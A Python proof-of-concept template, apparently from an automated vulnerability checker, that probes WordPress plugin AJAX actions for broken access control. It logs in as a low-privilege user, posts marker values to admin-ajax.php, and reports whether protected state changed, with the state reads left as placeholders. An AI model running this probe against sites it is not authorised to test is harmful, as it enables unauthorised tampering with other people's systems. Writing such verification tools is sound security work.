import requests
from wp_login import wp_login
from poc_result import emit_result

TARGET = "{{ target_url }}"
ACTION = "{{ ajax_action }}"
USERNAME = "{{ test_username }}"
PASSWORD = "{{ test_password }}"
ATTACKER_ROLE = "{{ attacker_role }}"

session = requests.Session()
if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
    login = wp_login(session, TARGET, USERNAME, PASSWORD)
    if not login.success:
        emit_result(
            verdict="not_vulnerable", oracle="state_change", attacker_role=ATTACKER_ROLE,
            request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
            attack={"observed": False, "before": None, "after": None},
            control={"observed": True, "before": None, "after": None},
            impact="Authentication failed before state could be tested.",
        )
        raise SystemExit(0)

marker = "squadrone_marker"
resp = session.post(
    f"{TARGET}/wp-admin/admin-ajax.php",
    data={
        "action": ACTION,
        "title": marker,
        "name": marker,
        "value": marker,
        {{ extra_params }}
    },
    timeout=20,
)

# Replace these placeholders with reads of the protected state before and after
# the real request. HTTP acceptance alone is not a state-change oracle.
before_state = None
after_state = None
control_before = None
control_after = None
observed = before_state != after_state and control_before == control_after
emit_result(
    verdict="vulnerable" if observed else "not_vulnerable",
    oracle="state_change",
    attacker_role=ATTACKER_ROLE,
    request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
    attack={"observed": observed, "before": before_state, "after": after_state},
    control={"observed": False if observed else True, "before": control_before, "after": control_after},
    integrity="high" if observed else "none",
    impact="The low-privilege request changed protected plugin state." if observed else "No protected state change was measured.",
)
